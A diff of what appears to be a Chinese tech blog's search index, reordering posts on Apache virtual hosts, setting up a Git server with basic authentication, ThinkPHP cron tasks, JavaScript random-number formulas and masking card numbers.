-<li>修改本地host文件, 自定义一个域名, 指向服务器<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdHRqZ3NqMzBjdzA2N3dlaC5qcGc?x-oss-process=image/format,png" alt=""></li>
-<li>修改 <code>sites-enables/000-default.conf</code> 文件，新增内容如下<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> &lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerName abcd.com</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot /var/www/html1</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error801.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access801.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
-内容如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDIuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVxc2c4bDBqMzBvczBhN2pzYy5qcGc?x-oss-process=image/format,png" alt=""></li>
-<li>访问（<code>http://abcd.com</code>）, 效果如下图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmd5MWZybXVrdTUxdjRqMzBkbTA2ZmdsbC5qcGc?x-oss-process=image/format,png" alt=""></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Apache</tag>
-        <tag>Ubuntu</tag>
       </tags>
   </entry>
   <entry>
@@ -675,42 +675,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>搭建Git服务器</title>
-    <url>/2018/10/23/24.html</url>
-    <content><![CDATA[<p>顺应时代的发展，Git成为了许多互联网公司进行项目版本控制的首选，本文笔者就对搭建Git服务器的过程做个记录。</p>
-<a id="more"></a>
-<h2 id="Apache和Git的安装"><a href="#Apache和Git的安装" class="headerlink" title="Apache和Git的安装"></a>Apache和Git的安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y httpd git</span><br></pre></td></tr></table></figure>
-
-<h2 id="创建Git仓库"><a href="#创建Git仓库" class="headerlink" title="创建Git仓库"></a>创建Git仓库</h2><ol>
-<li>新建一个目录<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /data/httpd/git</span><br></pre></td></tr></table></figure></li>
-<li>进入目录<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /data/httpd/git</span><br></pre></td></tr></table></figure></li>
-<li>创建项目目录并进入该目录<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir demo</span><br><span class="line">cd demo</span><br></pre></td></tr></table></figure></li>
-<li>创建Git仓库<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init --bare demo.git</span><br></pre></td></tr></table></figure></li>
-<li>分配权限<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R apache:apache .</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h2 id="创建Git用户验证的账号"><a href="#创建Git用户验证的账号" class="headerlink" title="创建Git用户验证的账号"></a>创建Git用户验证的账号</h2><ol>
-<li>创建用户<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">htpasswd -m -c /etc/httpd/conf.d/git-team.htpasswd zh1(zh1是账号然后连续输入两次密码)</span><br><span class="line"><span class="meta">#</span><span class="bash"> -c 是创建的意思，没有的时候创建，有的话会先删除文件再创建</span></span><br><span class="line">htpasswd -m /etc/httpd/conf.d/git-team.htpasswd zh2(如果第一个账号命令里有了-c 其它账号要去掉-c)</span><br></pre></td></tr></table></figure></li>
-<li>修改密码<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 先删除用户</span></span><br><span class="line">htpasswd -D 存放用户名和密码的文件名 用户</span><br><span class="line"><span class="meta">#</span><span class="bash"> 再添加用户</span></span><br><span class="line">htpasswd -m 存放用户名和密码的文件名 用户</span><br></pre></td></tr></table></figure></li>
-<li>修改用户密码文件的访问权限和所有者<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown apache:apache /etc/httpd/conf.d/git-team.htpasswd</span><br><span class="line">chmod 640 /etc/httpd/conf.d/git-team.htpasswd</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h2 id="修改apache的配置文件"><a href="#修改apache的配置文件" class="headerlink" title="修改apache的配置文件"></a>修改apache的配置文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">内容如下：</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName git.nsxsg.com(git服务器域名)</span><br><span class="line">    SetEnv GIT_HTTP_EXPORT_ALL</span><br><span class="line">    SetEnv GIT_PROJECT_ROOT /data/httpd/git(git仓库文件夹)</span><br><span class="line">    ScriptAlias /git/ /usr/libexec/git-core/git-http-backend/(URL中以/git/开头访问路径映射到Git，所以访问的时候域名后面要紧跟http://域名/git/项目名/项目名.git)</span><br><span class="line">    &lt;Location /&gt;</span><br><span class="line">        AuthType Basic</span><br><span class="line">        AuthName "Git"</span><br><span class="line">        AuthUserFile /etc/httpd/conf.d/git-team.htpasswd(用户密码文件地址)</span><br><span class="line">        Require valid-user</span><br><span class="line">    &lt;/Location&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="重启apache"><a href="#重启apache" class="headerlink" title="重启apache"></a>重启apache</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/httpd restart</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Apache</tag>
-        <tag>Git</tag>
-        <tag>版本控制系统</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Ubuntu下安装Redis</title>
     <url>/2018/11/01/25.html</url>
     <content><![CDATA[<p>许多的互联网公司将Redis作为数据库和缓存工具，本文笔者就如何在Ubuntu下安装Redis做一个记录。</p>
@@ -733,53 +697,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       <tags>
         <tag>Redis</tag>
         <tag>Ubuntu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ThinkPHP框架应用之定时任务</title>
-    <url>/2018/12/13/26.html</url>
-    <content><![CDATA[<p>定时任务是每个项目必不可少的功能。本文介绍一下如何使用ThinkPHP框架的定时任务。</p>
-<a id="more"></a>
-<h2 id="新建一个定时类"><a href="#新建一个定时类" class="headerlink" title="新建一个定时类"></a>新建一个定时类</h2><ol>
-<li><p>在 <code>application/admin/command</code> 目录下新建一个 <code>Test.php</code> 文件  </p>
-</li>
-<li><p>文件内容如下：  </p>
-</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">admin</span>\<span class="title">command</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Command</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Input</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">configure</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setName(<span class="string">'test'</span>)-&gt;setDescription(<span class="string">"计划任务 Test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">(Input $input, Output $output)</span></span>&#123;</span><br><span class="line">        $output-&gt;writeln(<span class="string">'Date Crontab job start...'</span>);</span><br><span class="line">        <span class="comment">/*** 这里写计划任务列表集 START ***/</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">$this</span>-&gt;test();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*** 这里写计划任务列表集 END ***/</span></span><br><span class="line">        $output-&gt;writeln(<span class="string">'Date Crontab job end...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'定时任务成功啦~'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>效果图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3ZTV6a29qMzFhcjBwbmdwZi5qcGc?x-oss-process=image/format,png" alt="image"></p>
-<h2 id="修改-command-php-文件"><a href="#修改-command-php-文件" class="headerlink" title="修改 command.php 文件"></a>修改 <code>command.php</code> 文件</h2><blockquote>
-<p>文件位置 <code>application/command.php</code></p>
-</blockquote>
-<ul>
-<li>修改内容如下</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'app\admin\command\Test'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
-
-<p>效果图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3Z3M1MWpqMzE3YzBsMzc2ZC5qcGc?x-oss-process=image/format,png" alt="image"></p>
-<h2 id="查看ThinkPHP框架中定时是否添加成功"><a href="#查看ThinkPHP框架中定时是否添加成功" class="headerlink" title="查看ThinkPHP框架中定时是否添加成功"></a>查看ThinkPHP框架中定时是否添加成功</h2><ul>
-<li>进入项目目录 <strong>（并非是根目录）</strong> ，使用命令查看</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php think</span><br></pre></td></tr></table></figure>
-
-<p>效果图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3ajM0eTZqMzFoNjBvYnRiYS5qcGc?x-oss-process=image/format,png" alt="image"></p>
-<h2 id="运行定时任务"><a href="#运行定时任务" class="headerlink" title="运行定时任务"></a>运行定时任务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php think test</span><br></pre></td></tr></table></figure>
-
-<p>效果如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3bGJwMTlqMzFoNjBvYm16Zy5qcGc?x-oss-process=image/format,png" alt="image"></p>
-<h2 id="在Linux中添加crontab"><a href="#在Linux中添加crontab" class="headerlink" title="在Linux中添加crontab"></a>在Linux中添加crontab</h2><ul>
-<li>编辑crontab</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编辑crontab</span></span><br><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入编辑模式后添加如下内容</span></span><br><span class="line">* * * * * php /home/wwwroot/demo.com/think test    # 每分钟执行一次计划任务</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存退出后重启crontab</span></span><br><span class="line">/etc/init.d/crond restart</span><br></pre></td></tr></table></figure>
-
-<p>效果图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3bmswcWJqMzB0djA2ZGRnMC5qcGc?x-oss-process=image/format,png" alt="image"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF4MGpvdTBqMzB0djAzandlbC5qcGc?x-oss-process=image/format,png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>ThinkPHP框架</tag>
-        <tag>定时任务</tag>
       </tags>
   </entry>
   <entry>
@@ -829,6 +746,89 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       <tags>
         <tag>ThinkPHP框架</tag>
         <tag>PHPExcel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建Git服务器</title>
+    <url>/2018/10/23/24.html</url>
+    <content><![CDATA[<p>顺应时代的发展，Git成为了许多互联网公司进行项目版本控制的首选，本文笔者就对搭建Git服务器的过程做个记录。</p>
+<a id="more"></a>
+<h2 id="Apache和Git的安装"><a href="#Apache和Git的安装" class="headerlink" title="Apache和Git的安装"></a>Apache和Git的安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y httpd git</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建Git仓库"><a href="#创建Git仓库" class="headerlink" title="创建Git仓库"></a>创建Git仓库</h2><ol>
+<li>新建一个目录<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /data/httpd/git</span><br></pre></td></tr></table></figure></li>
+<li>进入目录<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /data/httpd/git</span><br></pre></td></tr></table></figure></li>
+<li>创建项目目录并进入该目录<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir demo</span><br><span class="line">cd demo</span><br></pre></td></tr></table></figure></li>
+<li>创建Git仓库<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init --bare demo.git</span><br></pre></td></tr></table></figure></li>
+<li>分配权限<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R apache:apache .</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="创建Git用户验证的账号"><a href="#创建Git用户验证的账号" class="headerlink" title="创建Git用户验证的账号"></a>创建Git用户验证的账号</h2><ol>
+<li>创建用户<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">htpasswd -m -c /etc/httpd/conf.d/git-team.htpasswd zh1(zh1是账号然后连续输入两次密码)</span><br><span class="line"><span class="meta">#</span><span class="bash"> -c 是创建的意思，没有的时候创建，有的话会先删除文件再创建</span></span><br><span class="line">htpasswd -m /etc/httpd/conf.d/git-team.htpasswd zh2(如果第一个账号命令里有了-c 其它账号要去掉-c)</span><br></pre></td></tr></table></figure></li>
+<li>修改密码<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 先删除用户</span></span><br><span class="line">htpasswd -D 存放用户名和密码的文件名 用户</span><br><span class="line"><span class="meta">#</span><span class="bash"> 再添加用户</span></span><br><span class="line">htpasswd -m 存放用户名和密码的文件名 用户</span><br></pre></td></tr></table></figure></li>
+<li>修改用户密码文件的访问权限和所有者<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown apache:apache /etc/httpd/conf.d/git-team.htpasswd</span><br><span class="line">chmod 640 /etc/httpd/conf.d/git-team.htpasswd</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="修改apache的配置文件"><a href="#修改apache的配置文件" class="headerlink" title="修改apache的配置文件"></a>修改apache的配置文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">内容如下：</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName git.nsxsg.com(git服务器域名)</span><br><span class="line">    SetEnv GIT_HTTP_EXPORT_ALL</span><br><span class="line">    SetEnv GIT_PROJECT_ROOT /data/httpd/git(git仓库文件夹)</span><br><span class="line">    ScriptAlias /git/ /usr/libexec/git-core/git-http-backend/(URL中以/git/开头访问路径映射到Git，所以访问的时候域名后面要紧跟http://域名/git/项目名/项目名.git)</span><br><span class="line">    &lt;Location /&gt;</span><br><span class="line">        AuthType Basic</span><br><span class="line">        AuthName "Git"</span><br><span class="line">        AuthUserFile /etc/httpd/conf.d/git-team.htpasswd(用户密码文件地址)</span><br><span class="line">        Require valid-user</span><br><span class="line">    &lt;/Location&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="重启apache"><a href="#重启apache" class="headerlink" title="重启apache"></a>重启apache</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/httpd restart</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
+        <tag>Git</tag>
+        <tag>版本控制系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ThinkPHP框架应用之定时任务</title>
+    <url>/2018/12/13/26.html</url>
+    <content><![CDATA[<p>定时任务是每个项目必不可少的功能。本文介绍一下如何使用ThinkPHP框架的定时任务。</p>
+<a id="more"></a>
+<h2 id="新建一个定时类"><a href="#新建一个定时类" class="headerlink" title="新建一个定时类"></a>新建一个定时类</h2><ol>
+<li><p>在 <code>application/admin/command</code> 目录下新建一个 <code>Test.php</code> 文件  </p>
+</li>
+<li><p>文件内容如下：  </p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">admin</span>\<span class="title">command</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Command</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Input</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">configure</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setName(<span class="string">'test'</span>)-&gt;setDescription(<span class="string">"计划任务 Test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">(Input $input, Output $output)</span></span>&#123;</span><br><span class="line">        $output-&gt;writeln(<span class="string">'Date Crontab job start...'</span>);</span><br><span class="line">        <span class="comment">/*** 这里写计划任务列表集 START ***/</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">$this</span>-&gt;test();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*** 这里写计划任务列表集 END ***/</span></span><br><span class="line">        $output-&gt;writeln(<span class="string">'Date Crontab job end...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'定时任务成功啦~'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>效果图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3ZTV6a29qMzFhcjBwbmdwZi5qcGc?x-oss-process=image/format,png" alt="image"></p>
+<h2 id="修改-command-php-文件"><a href="#修改-command-php-文件" class="headerlink" title="修改 command.php 文件"></a>修改 <code>command.php</code> 文件</h2><blockquote>
+<p>文件位置 <code>application/command.php</code></p>
+</blockquote>
+<ul>
+<li>修改内容如下</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'app\admin\command\Test'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<p>效果图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3Z3M1MWpqMzE3YzBsMzc2ZC5qcGc?x-oss-process=image/format,png" alt="image"></p>
+<h2 id="查看ThinkPHP框架中定时是否添加成功"><a href="#查看ThinkPHP框架中定时是否添加成功" class="headerlink" title="查看ThinkPHP框架中定时是否添加成功"></a>查看ThinkPHP框架中定时是否添加成功</h2><ul>
+<li>进入项目目录 <strong>（并非是根目录）</strong> ，使用命令查看</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php think</span><br></pre></td></tr></table></figure>
+
+<p>效果图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3ajM0eTZqMzFoNjBvYnRiYS5qcGc?x-oss-process=image/format,png" alt="image"></p>
+<h2 id="运行定时任务"><a href="#运行定时任务" class="headerlink" title="运行定时任务"></a>运行定时任务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php think test</span><br></pre></td></tr></table></figure>
+
+<p>效果如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3bGJwMTlqMzFoNjBvYm16Zy5qcGc?x-oss-process=image/format,png" alt="image"></p>
+<h2 id="在Linux中添加crontab"><a href="#在Linux中添加crontab" class="headerlink" title="在Linux中添加crontab"></a>在Linux中添加crontab</h2><ul>
+<li>编辑crontab</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编辑crontab</span></span><br><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入编辑模式后添加如下内容</span></span><br><span class="line">* * * * * php /home/wwwroot/demo.com/think test    # 每分钟执行一次计划任务</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存退出后重启crontab</span></span><br><span class="line">/etc/init.d/crond restart</span><br></pre></td></tr></table></figure>
+
+<p>效果图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3bmswcWJqMzB0djA2ZGRnMC5qcGc?x-oss-process=image/format,png" alt="image"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF4MGpvdTBqMzB0djAzandlbC5qcGc?x-oss-process=image/format,png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>ThinkPHP框架</tag>
+        <tag>定时任务</tag>
       </tags>
   </entry>
   <entry>
@@ -1018,55 +1018,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>JavaScript生成随机数</title>
-    <url>/2017/09/17/3.html</url>
-    <content><![CDATA[<p>随机数在Web开发中的运用还是十分广泛的，比如：验证码的生成、密码的生成、抽奖系统等。</p>
-<a id="more"></a>
-<ul>
-<li><p>预备知识 <code>Math.random()</code> 函数返回0和1之间的伪随机数，可能为0，但总是小于1。</p>
-</li>
-<li><p>生成 <code>n-m</code> ，包含 <code>n</code> 但不包含 <code>m</code> 的整数</p>
-<ol>
-<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code> </li>
-<li>第二步：<code>Math.random()*w</code> </li>
-<li>第三步：<code>Math.random()*w+n</code> </li>
-<li>第四步：<code>parseInt(Math.random()*w+n,10)</code></li>
-</ol>
-</li>
-<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 但包含 <code>m</code> 的整数</p>
-<ol>
-<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
-<li>第二步：<code>Math.random()*w</code></li>
-<li>第三步：<code>Math.random()*w+n</code></li>
-<li>第四步：<code>Math.floor(Math.random()*w+n)+1</code></li>
-</ol>
-</li>
-<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 和 <code>m</code> 的整数</p>
-<ol>
-<li>第一步：算出 <code>m-n-2</code> 的值，假设等于 <code>w</code></li>
-<li>第二步：<code>Math.random()*w</code></li>
-<li>第三步：<code>Math.random()*w+n+1</code></li>
-<li>第四步：<code>Math.round(Math.random()*w+n+1)</code> 或者 <code>Math.ceil(Math.random()*w+n+1)</code></li>
-</ol>
-</li>
-<li><p>生成 <code>n-m</code>，包含 <code>n</code> 和 <code>m</code> 的整数</p>
-<ol>
-<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
-<li>第二步：<code>Math.random()*w</code></li>
-<li>第三步：<code>Math.random()*w+n</code></li>
-<li>第四步：<code>Math.round(Math.random()*w+n)</code> 或者 <code>Math.ceil(Math.random()*w+n)</code></li>
-</ol>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>JavaScript</category>
-      </categories>
-      <tags>
-        <tag>随机数</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux软件漏洞修复</title>
     <url>/2019/09/26/30.html</url>
     <content><![CDATA[<p>阿里云安全中心提示待处理漏洞，通过搜集资料笔者对漏洞进行了相应的处理，并通过了阿里云的验证。</p>
@@ -1139,6 +1090,82 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       <tags>
         <tag>dnmp环境</tag>
         <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JavaScript生成随机数</title>
+    <url>/2017/09/17/3.html</url>
+    <content><![CDATA[<p>随机数在Web开发中的运用还是十分广泛的，比如：验证码的生成、密码的生成、抽奖系统等。</p>
+<a id="more"></a>
+<ul>
+<li><p>预备知识 <code>Math.random()</code> 函数返回0和1之间的伪随机数，可能为0，但总是小于1。</p>
+</li>
+<li><p>生成 <code>n-m</code> ，包含 <code>n</code> 但不包含 <code>m</code> 的整数</p>
+<ol>
+<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code> </li>
+<li>第二步：<code>Math.random()*w</code> </li>
+<li>第三步：<code>Math.random()*w+n</code> </li>
+<li>第四步：<code>parseInt(Math.random()*w+n,10)</code></li>
+</ol>
+</li>
+<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 但包含 <code>m</code> 的整数</p>
+<ol>
+<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
+<li>第二步：<code>Math.random()*w</code></li>
+<li>第三步：<code>Math.random()*w+n</code></li>
+<li>第四步：<code>Math.floor(Math.random()*w+n)+1</code></li>
+</ol>
+</li>
+<li><p>生成 <code>n-m</code>，不包含 <code>n</code> 和 <code>m</code> 的整数</p>
+<ol>
+<li>第一步：算出 <code>m-n-2</code> 的值，假设等于 <code>w</code></li>
+<li>第二步：<code>Math.random()*w</code></li>
+<li>第三步：<code>Math.random()*w+n+1</code></li>
+<li>第四步：<code>Math.round(Math.random()*w+n+1)</code> 或者 <code>Math.ceil(Math.random()*w+n+1)</code></li>
+</ol>
+</li>
+<li><p>生成 <code>n-m</code>，包含 <code>n</code> 和 <code>m</code> 的整数</p>
+<ol>
+<li>第一步：算出 <code>m-n</code> 的值，假设等于 <code>w</code></li>
+<li>第二步：<code>Math.random()*w</code></li>
+<li>第三步：<code>Math.random()*w+n</code></li>
+<li>第四步：<code>Math.round(Math.random()*w+n)</code> 或者 <code>Math.ceil(Math.random()*w+n)</code></li>
+</ol>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>JavaScript</category>
+      </categories>
+      <tags>
+        <tag>随机数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用JS实现银行卡卡号和手机号的中间数字以星号表示</title>
+    <url>/2017/09/27/4.html</url>
+    <content><![CDATA[<p>在WAP开发过程中，肯定遇到过银行卡卡号和手机号的中间数字是星号的情况。下面来介绍一下如何使用原生JS实现这个功能。</p>
+<a id="more"></a>
+<p>废话不多说直接贴出银行卡卡号的代码：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"2222333344445555"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;4&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** **** $2"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<blockquote>
+<p>2222 <strong>** **</strong> 5555</p>
+</blockquote>
+<p>下面是手机号的代码（其实只要照着银行卡的代码略作修改就可以了）：</p>
